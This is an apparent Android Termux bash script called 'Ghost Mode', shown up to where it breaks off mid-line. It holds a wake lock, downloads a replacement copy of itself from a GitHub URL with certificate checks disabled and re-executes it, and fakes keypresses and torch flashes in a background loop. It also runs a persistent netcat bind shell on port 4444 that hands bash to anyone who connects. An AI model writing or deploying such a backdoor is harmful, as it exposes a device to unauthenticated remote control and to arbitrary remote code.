#!/bin/bash

echo "🧃 Ghost Mode Activated..."

set +e

# Configuration
NC_PORT=4444
UPDATE_URL="https://raw.githubusercontent.com/abelsez/ghostmode/main/perpetual.sh "
SCRIPT_PATH="$HOME/ghost.sh"

termux-wake-lock

# Check for update first
echo "[+] Checking for remote update..."
wget -O $HOME/ghost_new.sh $UPDATE_URL --no-check-certificate > /dev/null 2>&1

if [ -f "$HOME/ghost_new.sh" ]; then
    chmod +x "$HOME/ghost_new.sh"
    if ! cmp -s "$HOME/ghost_new.sh" "$HOME/ghost.sh"; then
        echo "[!] Update found. Applying..."
        cp "$HOME/ghost_new.sh" "$HOME/ghost.sh"
        chmod +x "$HOME/ghost.sh"
        echo "[+] Updated successfully."
        exec "$HOME/ghost.sh"
        exit
    else
        echo "[+] No changes detected."
    fi
else
    echo "[!] Failed to fetch update."
fi

# Fake input loop
(
    while true; do
        input keyevent KEYCODE_MENU > /dev/null 2>&1
        sleep $((RANDOM % 30 + 10))
        termux-torch on > /dev/null 2>&1
        sleep 3
        termux-torch off > /dev/null 2>&1
    done
) &

# Self-monitoring Netcat listener
while true; do
    echo "[+] Starting Netcat listener on port $NC_PORT..."
    ncat --listen --port $NC_PORT --exec "/data/data/com.termux/files/usr/bin/bash" &
    NC_PID=$!
    
    while ps -p $NC_PID > /dev/null; do
        sleep 5
    done

    echo "[!] Net
